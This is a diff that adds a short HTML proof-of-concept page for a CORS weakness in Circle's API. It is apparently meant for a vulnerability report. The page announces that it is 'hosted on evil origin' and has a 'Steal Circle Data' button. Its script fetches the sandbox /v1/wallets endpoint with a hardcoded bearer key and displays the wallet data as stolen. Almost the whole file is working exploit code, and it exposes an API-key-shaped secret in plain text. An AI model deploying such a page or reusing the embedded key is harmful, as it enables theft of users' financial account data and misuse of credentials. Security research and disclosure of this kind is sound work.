@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC - Circle</title>
+<style>
+body{font-family:Arial;padding:20px;background:#f0f0f0}
+#result{background:#000;color:#00ff00;padding:20px;border-radius:8px;white-space:pre-wrap}
+button{background:red;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer}
+</style>
+</head>
+<body>
+<h2>🔴 CORS PoC - Circle API</h2>
+<p>Hosted on evil origin stealing Circle USDC wallet data!</p>
+<button onclick="stealData()">Steal Circle Data</button>
+<div id="result">Click to steal data...</div>
+<script>
+function stealData() {
+    document.getElementById("result").innerText = "Fetching...";
+    fetch("https://api-sandbox.circle.com/v1/wallets", {
+        method: "GET",
+        headers: {
+            "Authorization": "Bearer SAND_API_KEY:e4e452c1aed7896b5344dc903ad69821:de75bef116fc85a08449f0fd618828ff"
+        }
+    })
+    .then(r => r.json())
+    .then(d => {
+        document.getElementById("result").innerText =
+            "✅ CIRCLE WALLET DATA STOLEN!\n\n" +
+            JSON.stringify(d, null, 2);
+    })
+    .catch(e => {
+        document.getElementById("result").innerText = "Error: " + e;
+    });
+}
+</script>
+</body>
+</html>
